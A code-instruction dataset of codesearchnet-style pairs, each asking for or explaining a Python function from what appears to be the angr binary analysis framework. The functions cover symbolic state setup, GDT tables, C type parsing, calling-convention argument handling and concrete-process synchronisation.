{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nloading a field of a given object", "response": "def load_field(self, state, field_name, field_type):\n        \"\"\"\n        Load a field of a given object, without resolving hierachy\n\n        :param state: angr state where we want to load the object attribute\n        :type SimState\n        :param field_name: name of the attribute\n        :type str\n        :param field_type: type of the attribute\n        :type str\n        \"\"\"\n        field_ref = SimSootValue_InstanceFieldRef(self.heap_alloc_id, self.type, field_name, field_type)\n        return state.memory.load(field_ref, none_if_missing=False)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a new object in the state.", "response": "def new_object(cls, state, type_, symbolic=False, init_object=False):\n        \"\"\"\n        Creates a new object reference.\n        :param state: State associated to the object.\n        :param type_: Class of the object.\n        :param init_object: Whether the objects initializer method should be run.\n        :return: Reference to the new object.\n        \"\"\"\n        # create reference\n        obj_ref = cls(heap_alloc_id=state.memory.get_new_uuid(), type_=type_, symbolic=symbolic)\n        # run initializer\n        if init_object:\n            l.info(\">\" * 15 + \" Initialize object %r ... \" + \">\" * 15, obj_ref)\n            # find initializer method\n            # TODO: add support for non-default initializing methods\n            init_method = resolve_method(state, '<init>', type_, init_class=False).address()\n\n            # setup init state\n            args = [SootArgument(obj_ref, obj_ref.type, is_this_ref=True)]\n            init_state = state.project.simos.state_call(init_method, *args,\n                                                        base_state=state,\n                                                        ret_addr=SootAddressTerminator())\n            # run init state\n            simgr = state.project.factory.simgr(init_state)\n            simgr.run()\n            # copy results from initialization to the state\n            state.memory.vm_static_table = simgr.deadended[0].memory.vm_static_table.copy()\n            state.memory.heap = simgr.deadended[0].memory.heap.copy()\n            l.debug(\"<\" * 15 + \" Initialize object %r ... done \" + \"<\" * 15, obj_ref)\n        return obj_ref"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nconfigure the project to set up global settings.", "response": "def configure_project(self):\n        \"\"\"\n        Configure the project to set up global settings (like SimProcedures).\n        \"\"\"\n        self.return_deadend = self.project.loader.extern_object.allocate()\n        self.project.hook(self.return_deadend, P['stubs']['CallReturn']())\n\n        self.unresolvable_jump_target = self.project.loader.extern_object.allocate()\n        self.project.hook(self.unresolvable_jump_target, P['stubs']['UnresolvableJumpTarget']())\n        self.unresolvable_call_target = self.project.loader.extern_object.allocate()\n        self.project.hook(self.unresolvable_call_target, P['stubs']['UnresolvableCallTarget']())\n\n        def irelative_resolver(resolver_addr):\n            # autohooking runs before this does, might have provided this already\n            # in that case, we want to advertise the _resolver_ address, since it is now\n            # providing the behavior of the actual function\n            if self.project.is_hooked(resolver_addr):\n                return resolver_addr\n\n\n            base_state = self.state_blank(addr=0,\n                add_options={o.SYMBOL_FILL_UNCONSTRAINED_MEMORY, o.SYMBOL_FILL_UNCONSTRAINED_REGISTERS})\n            resolver = self.project.factory.callable(resolver_addr, concrete_only=True, base_state=base_state)\n            try:\n                if isinstance(self.arch, ArchS390X):\n                    # On s390x ifunc resolvers expect hwcaps.\n                    val = resolver(0)\n                else:\n                    val = resolver()\n            except AngrCallableMultistateError:\n                _l.error(\"Resolver at %#x failed to resolve! (multivalued)\", resolver_addr)\n                return None\n            except AngrCallableError:\n                _l.error(\"Resolver at %#x failed to resolve!\", resolver_addr)\n                return None\n\n            return val._model_concrete.value\n\n        self.project.loader.perform_irelative_relocs(irelative_resolver)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ninitialize a blank state.", "response": "def state_blank(self, addr=None, initial_prefix=None, brk=None, stack_end=None, stack_size=1024*1024*8, stdin=None, **kwargs):\n        \"\"\"\n        Initialize a blank state.\n\n        All parameters are optional.\n\n        :param addr:            The execution start address.\n        :param initial_prefix:\n        :param stack_end:       The end of the stack (i.e., the byte after the last valid stack address).\n        :param stack_size:      The number of bytes to allocate for stack space\n        :param brk:             The address of the process' break.\n        :return:                The initialized SimState.\n\n        Any additional arguments will be passed to the SimState constructor\n        \"\"\"\n        # TODO: move ALL of this into the SimState constructor\n        if kwargs.get('mode', None) is None:\n            kwargs['mode'] = self.project._default_analysis_mode\n        if kwargs.get('permissions_backer', None) is None:\n            # just a dict of address ranges to permission bits\n            permission_map = { }\n            for obj in self.project.loader.all_objects:\n                for seg in obj.segments:\n                    perms = 0\n                    # bit values based off of protection bit values from sys/mman.h\n                    if seg.is_readable:\n                        perms |= 1  # PROT_READ\n                    if seg.is_writable:\n                        perms |= 2  # PROT_WRITE\n                    if seg.is_executable:\n                        perms |= 4  # PROT_EXEC\n                    permission_map[(seg.min_addr, seg.max_addr)] = perms\n            permissions_backer = (self.project.loader.main_object.execstack, permission_map)\n            kwargs['permissions_backer'] = permissions_backer\n        if kwargs.get('memory_backer', None) is None:\n            kwargs['memory_backer'] = self.project.loader.memory\n        if kwargs.get('os_name', None) is None:\n            kwargs['os_name'] = self.name\n\n        state = SimState(self.project, **kwargs)\n\n        if stdin is not None and not isinstance(stdin, SimFileBase):\n            if type(stdin) is type:\n                stdin = stdin(name='stdin', has_end=False)\n            else:\n                stdin = SimFileStream(name='stdin', content=stdin, has_end=True)\n\n        last_addr = self.project.loader.main_object.max_addr\n        actual_brk = (last_addr - last_addr % 0x1000 + 0x1000) if brk is None else brk\n        state.register_plugin('posix', SimSystemPosix(stdin=stdin, brk=actual_brk))\n\n\n        actual_stack_end = state.arch.initial_sp if stack_end is None else stack_end\n        if o.ABSTRACT_MEMORY not in state.options:\n            state.memory.mem._preapproved_stack = IRange(actual_stack_end - stack_size, actual_stack_end)\n\n        if state.arch.sp_offset is not None:\n            state.regs.sp = actual_stack_end\n\n        if initial_prefix is not None:\n            for reg in state.arch.default_symbolic_registers:\n                state.registers.store(reg, state.solver.BVS(\n                    initial_prefix + \"_\" + reg,\n                    state.arch.bits,\n                    explicit_name=True,\n                    key=('reg', reg),\n                    eternal=True))\n\n        for reg, val, is_addr, mem_region in state.arch.default_register_values:\n\n            region_base = None  # so pycharm does not complain\n\n            if is_addr:\n                if isinstance(mem_region, tuple):\n                    # unpack it\n                    mem_region, region_base = mem_region\n                elif mem_region == 'global':\n                    # Backward compatibility\n                    region_base = 0\n                else:\n                    raise AngrSimOSError('You must specify the base address for memory region \"%s\". ' % mem_region)\n\n            # special case for stack pointer override\n            if actual_stack_end is not None and state.arch.registers[reg][0] == state.arch.sp_offset:\n                continue\n\n            if o.ABSTRACT_MEMORY in state.options and is_addr:\n                address = claripy.ValueSet(state.arch.bits, mem_region, region_base, val)\n                state.registers.store(reg, address)\n            else:\n                state.registers.store(reg, val)\n\n        if addr is None: addr = self.project.entry\n        state.regs.ip = addr\n\n        # set up the \"root history\" node\n        state.scratch.ins_addr = addr\n        state.scratch.bbl_addr = addr\n        state.scratch.stmt_idx = 0\n        state.history.jumpkind = 'Ijk_Boring'\n\n        return state"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef prepare_call_state(self, calling_state, initial_state=None,\n                           preserve_registers=(), preserve_memory=()):\n        \"\"\"\n        This function prepares a state that is executing a call instruction.\n        If given an initial_state, it copies over all of the critical registers to it from the\n        calling_state. Otherwise, it prepares the calling_state for action.\n\n        This is mostly used to create minimalistic for CFG generation. Some ABIs, such as MIPS PIE and\n        x86 PIE, require certain information to be maintained in certain registers. For example, for\n        PIE MIPS, this function transfer t9, gp, and ra to the new state.\n        \"\"\"\n\n        if isinstance(self.arch, ArchMIPS32):\n            if initial_state is not None:\n                initial_state = self.state_blank()\n            mips_caller_saves = ('s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'gp', 'sp', 'bp', 'ra')\n            preserve_registers = preserve_registers + mips_caller_saves + ('t9',)\n\n        if initial_state is None:\n            new_state = calling_state.copy()\n        else:\n            new_state = initial_state.copy()\n            for reg in set(preserve_registers):\n                new_state.registers.store(reg, calling_state.registers.load(reg))\n            for addr, val in set(preserve_memory):\n                new_state.memory.store(addr, calling_state.memory.load(addr, val))\n\n        return new_state", "response": "This function prepares a state that is executing a call instruction."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\npreparing the address space with the data necessary to perform relocations pointing to the given symbol_name.", "response": "def prepare_function_symbol(self, symbol_name, basic_addr=None):\n        \"\"\"\n        Prepare the address space with the data necessary to perform relocations pointing to the given symbol\n\n        Returns a 2-tuple. The first item is the address of the function code, the second is the address of the\n        relocation target.\n        \"\"\"\n        if basic_addr is None:\n            basic_addr = self.project.loader.extern_object.get_pseudo_addr(symbol_name)\n        return basic_addr, basic_addr"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef setup_gdt(self, state, gdt):\n        state.memory.store(gdt.addr+8, gdt.table)\n        state.regs.gdt = gdt.gdt\n        state.regs.cs = gdt.cs\n        state.regs.ds = gdt.ds\n        state.regs.es = gdt.es\n        state.regs.ss = gdt.ss\n        state.regs.fs = gdt.fs\n        state.regs.gs = gdt.gs", "response": "Setup the state. regs. gdt to the object in which to write the GDT."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef generate_gdt(self, fs, gs, fs_size=0xFFFFFFFF, gs_size=0xFFFFFFFF):\n        A_PRESENT = 0x80\n        A_DATA = 0x10\n        A_DATA_WRITABLE = 0x2\n        A_PRIV_0 = 0x0\n        A_DIR_CON_BIT = 0x4\n        F_PROT_32 = 0x4\n        S_GDT = 0x0\n        S_PRIV_0 = 0x0\n        GDT_ADDR = 0x4000\n        GDT_LIMIT = 0x1000\n\n        normal_entry = self._create_gdt_entry(0, 0xFFFFFFFF,\n                                             A_PRESENT | A_DATA | A_DATA_WRITABLE | A_PRIV_0 | A_DIR_CON_BIT,\n                                             F_PROT_32)\n        stack_entry = self._create_gdt_entry(0, 0xFFFFFFFF, A_PRESENT | A_DATA | A_DATA_WRITABLE | A_PRIV_0,\n                                            F_PROT_32)\n        fs_entry = self._create_gdt_entry(fs, fs_size,\n                                         A_PRESENT | A_DATA | A_DATA_WRITABLE | A_PRIV_0 | A_DIR_CON_BIT, F_PROT_32)\n        gs_entry = self._create_gdt_entry(gs, gs_size,\n                                         A_PRESENT | A_DATA | A_DATA_WRITABLE | A_PRIV_0 | A_DIR_CON_BIT, F_PROT_32)\n\n        table = normal_entry + stack_entry + fs_entry + gs_entry\n        gdt =  (GDT_ADDR << 16 | GDT_LIMIT)\n        selector = self._create_selector(1, S_GDT | S_PRIV_0)\n        cs = selector\n        ds = selector\n        es = selector\n        selector = self._create_selector(2, S_GDT | S_PRIV_0)\n        ss = selector\n        selector = self._create_selector(3, S_GDT | S_PRIV_0)\n        fs = selector\n        selector = self._create_selector(4, S_GDT | S_PRIV_0)\n        gs = selector\n        global_descriptor_table = GlobalDescriptorTable(GDT_ADDR, GDT_LIMIT, table, gdt, cs, ds, es, ss, fs, gs)\n        return global_descriptor_table", "response": "Generate a GlobalDescriptorTable object and populate it using the value of the fs and gs segments."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nregisters a struct definition globally", "response": "def define_struct(defn):\n    \"\"\"\n    Register a struct definition globally\n\n    >>> define_struct('struct abcd {int x; int y;}')\n    \"\"\"\n    struct = parse_type(defn)\n    ALL_TYPES[struct.name] = struct\n    return struct"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrunning a string through the C preprocessor that ships with pycparser but is weirdly inaccessible?", "response": "def do_preprocess(defn):\n    \"\"\"\n    Run a string through the C preprocessor that ships with pycparser but is weirdly inaccessible?\n    \"\"\"\n    from pycparser.ply import lex, cpp\n    lexer = lex.lex(cpp)\n    p = cpp.Preprocessor(lexer)\n    # p.add_path(dir) will add dir to the include search path\n    p.parse(defn)\n    return ''.join(tok.value for tok in p.parser if tok.type not in p.ignore)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nparse a series of C definitions returns a tuple of two type mappings one for variable definitions and one for type definitions.", "response": "def parse_file(defn, preprocess=True):\n    \"\"\"\n    Parse a series of C definitions, returns a tuple of two type mappings, one for variable\n    definitions and one for type definitions.\n    \"\"\"\n    if pycparser is None:\n        raise ImportError(\"Please install pycparser in order to parse C definitions\")\n\n    defn = '\\n'.join(x for x in defn.split('\\n') if _include_re.match(x) is None)\n\n    if preprocess:\n        defn = do_preprocess(defn)\n\n    preamble, ignoreme = make_preamble()\n    node = pycparser.c_parser.CParser().parse(preamble + defn)\n    if not isinstance(node, pycparser.c_ast.FileAST):\n        raise ValueError(\"Something went horribly wrong using pycparser\")\n    out = {}\n    extra_types = {}\n    for piece in node.ext:\n        if isinstance(piece, pycparser.c_ast.FuncDef):\n            out[piece.decl.name] = _decl_to_type(piece.decl.type, extra_types)\n        elif isinstance(piece, pycparser.c_ast.Decl):\n            ty = _decl_to_type(piece.type, extra_types)\n            if piece.name is not None:\n                out[piece.name] = ty\n        elif isinstance(piece, pycparser.c_ast.Typedef):\n            extra_types[piece.name] = _decl_to_type(piece.type, extra_types)\n\n    for ty in ignoreme:\n        del extra_types[ty]\n    return out, extra_types"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef parse_type(defn, preprocess=True):\n    if pycparser is None:\n        raise ImportError(\"Please install pycparser in order to parse C definitions\")\n\n    defn = 'typedef ' + defn.strip('; \\n\\t\\r') + ' QQQQ;'\n\n    if preprocess:\n        defn = do_preprocess(defn)\n\n    node = pycparser.c_parser.CParser().parse(make_preamble()[0] + defn)\n    if not isinstance(node, pycparser.c_ast.FileAST) or \\\n            not isinstance(node.ext[-1], pycparser.c_ast.Typedef):\n        raise ValueError(\"Something went horribly wrong using pycparser\")\n\n    decl = node.ext[-1].type\n    return _decl_to_type(decl)", "response": "Parse a simple type expression into a SimType\n   "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning the alignment of the type in bytes.", "response": "def alignment(self):\n        \"\"\"\n        The alignment of the type in bytes.\n        \"\"\"\n        if self._arch is None:\n            return NotImplemented\n        return self.size // self._arch.byte_width"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nsynchronizes the concrete registers with the one getting from the concrete process memory.", "response": "def sync(self):\n        \"\"\"\n        Handle the switch between the concrete execution and angr.\n        This method takes care of:\n        1- Synchronize registers.\n        2- Set a concrete target to the memory backer so the memory reads are redirected in the concrete process memory.\n        3- If possible restore the SimProcedures with the real addresses inside the concrete process.\n        4- Set an inspect point to sync the segments register as soon as they are read during the symbolic execution.\n        5- Flush all the pages loaded until now.\n\n        :return:\n        \"\"\"\n\n        def _sync_segments(state):\n            \"\"\"\n            Segment registers synchronization is on demand as soon as the\n            symbolic execution access a segment register.\n            \"\"\"\n            concr_target = state.project.concrete_target\n\n            if isinstance(state.arch, ArchAMD64):\n                state.project.simos.initialize_segment_register_x64(state, concr_target)\n            elif isinstance(state.arch, ArchX86):\n                gdt = state.project.simos.initialize_gdt_x86(state, concr_target)\n                state.concrete.whitelist.append((gdt.addr, gdt.addr + gdt.limit))\n\n            state.inspect.remove_breakpoint('reg_read', bp=state.concrete.fs_register_bp)\n            state.concrete.segment_registers_initialized = True\n\n            state.concrete.fs_register_bp = None\n\n        l.debug(\"Sync the state with the concrete memory inside the Concrete plugin\")\n\n        target = self.state.project.concrete_target\n\n        # Setting a concrete memory backend\n        self.state.memory.mem._memory_backer.set_concrete_target(target)\n\n        # Sync angr registers with the one getting from the concrete target\n        # registers that we don't want to concretize.\n        l.debug(\"Synchronizing general purpose registers\")\n\n        to_sync_register = list(filter(lambda x: x.concrete, self.state.arch.register_list))\n\n        for register in to_sync_register:\n\n            # before let's sync all the subregisters of the current register.\n            # sometimes this can be helpful ( i.e. ymmm0 e xmm0 )\n            if register.subregisters:\n                subregisters_names = map(lambda x: x[0], register.subregisters)\n                self._sync_registers(subregisters_names, target)\n\n            # finally let's synchronize the whole register\n            self._sync_registers([register.name], target)\n\n        if self.synchronize_cle:\n            self._sync_cle(target)\n\n        # Synchronize the imported functions addresses (.got, IAT) in the\n        # concrete process with ones used in the SimProcedures dictionary\n        if self.state.project._should_use_sim_procedures and not self.state.project.loader.main_object.pic:\n            l.debug(\"Restoring SimProc using concrete memory\")\n\n            for reloc in self.state.project.loader.main_object.relocs:\n                if reloc.symbol:  # consider only reloc with a symbol\n                    l.debug(\"Trying to re-hook SimProc %s\", reloc.symbol.name)\n                    # l.debug(\"reloc.rebased_addr: %#x \" % reloc.rebased_addr)\n                    func_address = target.read_memory(reloc.rebased_addr, self.state.project.arch.bits / 8)\n                    func_address = struct.unpack(self.state.project.arch.struct_fmt(), func_address)[0]\n                    l.debug(\"Function address hook is now: %#x \", func_address)\n                    self.state.project.rehook_symbol(func_address, reloc.symbol.name)\n\n                    if self.synchronize_cle and not self.state.project.loader.main_object.contains_addr(func_address):\n                        old_func_symbol = self.state.project.loader.find_symbol(reloc.symbol.name)\n\n                        if old_func_symbol:  # if we actually have a symbol\n                            owner_obj = old_func_symbol.owner\n\n                            # calculating the new real address\n                            new_relative_address = func_address - owner_obj.mapped_base\n\n                            new_func_symbol = cle.backends.Symbol(owner_obj, old_func_symbol.name, new_relative_address,\n                                                                  old_func_symbol.size, old_func_symbol.type)\n\n                            for new_reloc in self.state.project.loader.find_relevant_relocations(old_func_symbol.name):\n                                if new_reloc.symbol.name == new_func_symbol.name and \\\n                                        new_reloc.value != new_func_symbol.rebased_addr:\n\n                                    l.debug(\"Updating CLE symbols metadata, moving %s from 0x%x to 0x%x\",\n                                            new_reloc.symbol.name,\n                                            new_reloc.value,\n                                            new_func_symbol.rebased_addr)\n\n                                    new_reloc.resolve(new_func_symbol)\n                                    new_reloc.relocate([])\n\n        else:\n            l.debug(\"SimProc not restored, you are going to simulate also the code of external libraries!\")\n\n        # flush the angr memory in order to synchronize them with the content of the\n        # concrete process memory when a read/write to the page is performed\n        self.state.memory.flush_pages(self.whitelist)\n        l.info(\"Exiting SimEngineConcrete: simulated address %x concrete address %x \", self.state.addr,\n               target.read_register(\"pc\"))\n\n        # now we have to register a SimInspect in order to synchronize the segments register\n        # on demand when the symbolic execution accesses it\n        if not self.segment_registers_callback_initialized:\n            segment_register_name = self.state.project.simos.get_segment_register_name()\n            if segment_register_name:\n                self.fs_register_bp = self.state.inspect.b('reg_read',\n                                                           reg_read_offset=segment_register_name,\n                                                           action=_sync_segments)\n\n                self.segment_registers_callback_initialized = True\n\n                l.debug(\"Set SimInspect breakpoint to the new state!\")\n            else:\n                l.error(\"Can't set breakpoint to synchronize segments registers, horrible things will happen.\")"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncalculates the similarity between two states.", "response": "def similarity(state_a, state_b):\n        \"\"\"\n        The (L2) distance between the counts of the state addresses in the history of the path.\n        :param state_a: The first state to compare\n        :param state_b: The second state to compare\n        \"\"\"\n        count_a = Counter(state_a.history.bbl_addrs)\n        count_b = Counter(state_b.history.bbl_addrs)\n        normal_distance = sum((count_a.get(addr, 0) - count_b.get(addr, 0)) ** 2\n                              for addr in set(list(count_a.keys()) + list(count_b.keys()))) ** 0.5\n        return 1.0 / (1 + normal_distance)"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nresolves the given method based on the given characteristics.", "response": "def resolve_method(state, method_name, class_name, params=(), ret_type=None,\n                   include_superclasses=True, init_class=True,\n                   raise_exception_if_not_found=False):\n    \"\"\"\n    Resolves the method based on the given characteristics (name, class and\n    params) The method may be defined in one of the superclasses of the given\n    class (TODO: support interfaces).\n\n    :rtype: archinfo.arch_soot.SootMethodDescriptor\n    \"\"\"\n    base_class = state.javavm_classloader.get_class(class_name)\n    if include_superclasses:\n        class_hierarchy = state.javavm_classloader.get_class_hierarchy(base_class)\n    else:\n        class_hierarchy = [base_class]\n    # walk up in class hierarchy, until method is found\n    for class_descriptor in class_hierarchy:\n        java_binary = state.project.loader.main_object\n        soot_method = java_binary.get_soot_method(method_name, class_descriptor.name,\n                                                  params, none_if_missing=True)\n        if soot_method is not None:\n            # init the class\n            if init_class:\n                state.javavm_classloader.init_class(class_descriptor)\n            return SootMethodDescriptor.from_soot_method(soot_method)\n\n    # method could not be found\n    # => we are executing code that is not loaded (typically library code)\n    # => fallback: continue with infos available from the invocation, so we\n    #              still can use SimProcedures\n    if raise_exception_if_not_found:\n        raise SootMethodNotLoadedException()\n    else:\n        return SootMethodDescriptor(class_name, method_name, params, ret_type=ret_type)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef from_arg_kinds(cls, arch, fp_args, ret_fp=False, sizes=None, sp_delta=None, func_ty=None):\n        basic = cls(arch, sp_delta=sp_delta, func_ty=func_ty)\n        basic.args = basic.arg_locs(fp_args, sizes)\n        basic.ret_val = basic.fp_return_val if ret_fp else basic.return_val\n        return basic", "response": "Create an instance of the class from the given arguments."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef int_args(self):\n        if self.ARG_REGS is None:\n            raise NotImplementedError()\n        for reg in self.ARG_REGS:            # pylint: disable=not-an-iterable\n            yield SimRegArg(reg, self.arch.bytes)", "response": "Iterate through all possible arg positions that can only be used to store integer or pointer values."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\niterates through all possible arg positions that can be used to store any kind of argument in a specific class.", "response": "def both_args(self):\n        \"\"\"\n        Iterate through all the possible arg positions that can be used to store any kind of argument\n        Does not take into account customizations.\n\n        Returns an iterator of SimFunctionArguments\n        \"\"\"\n        turtle = self.STACKARG_SP_BUFF + self.STACKARG_SP_DIFF\n        while True:\n            yield SimStackArg(turtle, self.arch.bytes)\n            turtle += self.arch.bytes"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\niterate through all the possible arg positions that can only be used to store floating point values.", "response": "def fp_args(self):\n        \"\"\"\n        Iterate through all the possible arg positions that can only be used to store floating point values\n        Does not take into account customizations.\n\n        Returns an iterator of SimFunctionArguments\n        \"\"\"\n        if self.FP_ARG_REGS is None:\n            raise NotImplementedError()\n        for reg in self.FP_ARG_REGS:        # pylint: disable=not-an-iterable\n            yield SimRegArg(reg, self.arch.registers[reg][1])"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nreturns True if the argument is a floating point argument False otherwise.", "response": "def is_fp_arg(self, arg):\n        \"\"\"\n        This should take a SimFunctionArgument instance and return whether or not that argument is a floating-point\n        argument.\n\n        Returns True for MUST be a floating point arg,\n                False for MUST NOT be a floating point arg,\n                None for when it can be either.\n        \"\"\"\n        if arg in self.int_args:\n            return False\n        if arg in self.fp_args or arg == self.FP_RETURN_VAL:\n            return True\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef stack_space(self, args):\n        out = self.STACKARG_SP_DIFF\n        for arg in args:\n            if isinstance(arg, SimStackArg):\n                out = max(out, arg.stack_offset + self.arch.bytes)\n\n        out += self.STACKARG_SP_BUFF\n        return out", "response": "Returns the number of bytes that should be allocated on the stack."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn a list of locations for each argument of the current function.", "response": "def arg_locs(self, is_fp=None, sizes=None):\n        \"\"\"\n        Pass this a list of whether each parameter is floating-point or not, and get back a list of\n        SimFunctionArguments. Optionally, pass a list of argument sizes (in bytes) as well.\n\n        If you've customized this CC, this will sanity-check the provided locations with the given list.\n        \"\"\"\n        session = self.arg_session\n        if self.func_ty is None:\n            # No function prototype is provided. `is_fp` must be provided.\n            if is_fp is None:\n                raise ValueError('\"is_fp\" must be provided when no function prototype is available.')\n        else:\n            # let's rely on the func_ty for the number of arguments and whether each argument is FP or not\n            is_fp = [ True if isinstance(arg, (SimTypeFloat, SimTypeDouble)) else False for arg in self.func_ty.args ]\n\n        if sizes is None: sizes = [self.arch.bytes] * len(is_fp)\n        return [session.next_arg(ifp, size=sz) for ifp, sz in zip(is_fp, sizes)]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef arg(self, state, index, stack_base=None):\n        session = self.arg_session\n        if self.args is None:\n            arg_loc = [session.next_arg(False) for _ in range(index + 1)][-1]\n        else:\n            arg_loc = self.args[index]\n\n        return arg_loc.get_value(state, stack_base=stack_base)", "response": "Returns a bitvector expression representing the nth argument of a function."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns a list of bitvector expressions representing the arguments of a function.", "response": "def get_args(self, state, is_fp=None, sizes=None, stack_base=None):\n        \"\"\"\n        `is_fp` should be a list of booleans specifying whether each corresponding argument is floating-point -\n        True for fp and False for int. For a shorthand to assume that all the parameters are int, pass the number of\n        parameters as an int.\n\n        If you've customized this CC, you may omit this parameter entirely. If it is provided, it is used for\n        sanity-checking.\n\n        `sizes` is an optional list of argument sizes, in bytes. Be careful about using this if you've made explicit\n        the arg locations, since it might decide to combine two locations into one if an arg is too big.\n\n        `stack_base` is an optional pointer to the top of the stack at the function start. If it is not\n        specified, use the current stack pointer.\n\n        Returns a list of bitvector expressions representing the arguments of a function.\n        \"\"\"\n        if sizes is None and self.func_ty is not None:\n            sizes = [arg.size for arg in self.func_ty.args]\n        if is_fp is None:\n            if self.args is None:\n                if self.func_ty is None:\n                    raise ValueError(\"You must either customize this CC or pass a value to is_fp!\")\n                else:\n                    arg_locs = self.arg_locs([False]*len(self.func_ty.args))\n            else:\n                arg_locs = self.args\n\n        elif type(is_fp) is int:\n            if self.args is not None and len(self.args) != is_fp:\n                raise ValueError(\"Bad number of args requested: got %d, expected %d\" % (is_fp, len(self.args)))\n            arg_locs = self.arg_locs([False]*is_fp, sizes)\n        else:\n            arg_locs = self.arg_locs(is_fp, sizes)\n\n        return [loc.get_value(state, stack_base=stack_base) for loc in arg_locs]"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef setup_callsite(self, state, ret_addr, args, stack_base=None, alloc_base=None, grow_like_stack=True):\n\n        # STEP 0: clerical work\n\n        if isinstance(self, SimCCSoot):\n            SimEngineSoot.setup_callsite(state, args, ret_addr)\n            return\n\n        allocator = AllocHelper(self.arch.bits, self.arch.memory_endness == 'Iend_LE')\n\n        #\n        # STEP 1: convert all values into serialized form\n        # this entails creating the vals list of simple values to store and also populating the allocator's\n        # understanding of what aux data needs to be stored\n        # This is also where we compute arg locations (arg_locs)\n        #\n\n        if self.func_ty is not None:\n            vals = [self._standardize_value(arg, ty, state, allocator.dump) for arg, ty in zip(args, self.func_ty.args)]\n        else:\n            vals = [self._standardize_value(arg, None, state, allocator.dump) for arg in args]\n\n        arg_session = self.arg_session\n        arg_locs = [None]*len(args)\n        for i, (arg, val) in enumerate(zip(args, vals)):\n            if self.is_fp_value(arg) or \\\n                    (self.func_ty is not None and isinstance(self.func_ty.args[i], SimTypeFloat)):\n                arg_locs[i] = arg_session.next_arg(is_fp=True, size=val.length // state.arch.byte_width)\n                continue\n            if val.length > state.arch.bits or (self.func_ty is None and isinstance(arg, (bytes, str, list, tuple))):\n                vals[i] = allocator.dump(val, state)\n            elif val.length < state.arch.bits:\n                if self.arch.memory_endness == 'Iend_LE':\n                    vals[i] = val.concat(claripy.BVV(0, state.arch.bits - val.length))\n                else:\n                    vals[i] = claripy.BVV(0, state.arch.bits - val.length).concat(val)\n            arg_locs[i] = arg_session.next_arg(is_fp=False, size=vals[i].length // state.arch.byte_width)\n\n        #\n        # STEP 2: decide on memory storage locations\n        # implement the contract for stack_base/alloc_base/grow_like_stack\n        # after this, stack_base should be the final stack pointer, alloc_base should be the final aux storage location,\n        # and the stack pointer should be updated\n        #\n\n        if stack_base is None:\n            if alloc_base is None:\n                alloc_size = allocator.size()\n                state.regs.sp -= alloc_size\n                alloc_base = state.regs.sp\n                grow_like_stack = False\n\n            state.regs.sp -= self.stack_space(arg_locs)\n\n            # handle alignment\n            alignment = (state.regs.sp + self.STACKARG_SP_DIFF) % self.STACK_ALIGNMENT\n            state.regs.sp -= alignment\n\n        else:\n            state.regs.sp = stack_base\n\n            if alloc_base is None:\n                alloc_base = stack_base + self.stack_space(arg_locs)\n                grow_like_stack = False\n\n        if grow_like_stack:\n            alloc_base -= allocator.size()\n        if type(alloc_base) is int:\n            alloc_base = claripy.BVV(alloc_base, state.arch.bits)\n\n        for i, val in enumerate(vals):\n            vals[i] = allocator.translate(val, alloc_base)\n\n        #\n        # STEP 3: store everything!\n        #\n\n        allocator.apply(state, alloc_base)\n\n        for loc, val in zip(arg_locs, vals):\n            if val.length > loc.size * 8:\n                raise ValueError(\"Can't fit value {} into location {}\".format(repr(val), repr(loc)))\n            loc.set_value(state, val, endness='Iend_BE', stack_base=stack_base)\n        self.return_addr.set_value(state, ret_addr, stack_base=stack_base)", "response": "This function sets up the callsite for the caller."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_return_val(self, state, is_fp=None, size=None, stack_base=None):\n        ty = self.func_ty.returnty if self.func_ty is not None else None\n        if self.ret_val is not None:\n            loc = self.ret_val\n        elif is_fp is not None:\n            loc = self.FP_RETURN_VAL if is_fp else self.RETURN_VAL\n        elif ty is not None:\n            loc = self.FP_RETURN_VAL if isinstance(ty, SimTypeFloat) else self.RETURN_VAL\n        else:\n            loc = self.RETURN_VAL\n\n        if loc is None:\n            raise NotImplementedError(\"This SimCC doesn't know how to get this value - should be implemented\")\n\n        val = loc.get_value(state, stack_base=stack_base, size=None if ty is None else ty.size//state.arch.byte_width)\n        if self.is_fp_arg(loc) or self.is_fp_value(val) or isinstance(ty, SimTypeFloat):\n            val = val.raw_to_fp()\n        return val", "response": "Get the return value out of the given state"}
